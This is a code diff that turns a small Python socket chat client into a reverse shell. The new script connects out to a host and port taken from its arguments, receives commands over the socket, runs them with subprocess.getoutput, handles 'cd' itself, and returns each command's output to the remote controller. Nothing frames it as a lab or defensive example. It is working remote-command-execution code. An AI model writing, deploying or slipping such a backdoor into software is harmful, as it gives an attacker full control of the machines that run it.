@@ -1,20 +1,39 @@
 import socket
-from decouple import config
+# from decouple import config
+import sys
+import os
+import subprocess
 
-DNS = config('DNS')
+# DNS = config('DNS')
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conexao:
-    conexao.connect((DNS, 2202))
+    conexao.connect((sys.argv[1], int(sys.argv[2])))
 
     print('Conectado\n')
 
     endereco, porta = conexao.getpeername()
 
     while True:
-        dados = input('>>> ')
+        try:
+            comando = conexao.recv(1024).decode()
 
-        conexao.sendall(dados.encode())
+            if comando[:2] == 'cd':
+                try:
+                    os.chdir(comando[3:])
+                    conexao.sendall('continue'.encode())
+                    continue
+                except FileNotFoundError:
+                    os.chdir(repr(comando[3:]))
+                    conexao.sendall('continue'.encode())
+                    continue
 
-        dados = conexao.recv(1024)
+            output = subprocess.getoutput(comando)
 
-        print(f'\n({endereco}:{porta}) - {dados.decode()}\n')
+            if not output:
+                conexao.sendall('continue'.encode())
+                continue
+
+            conexao.sendall(output.encode())
+        except BrokenPipeError:
+            conexao.close()
+            break
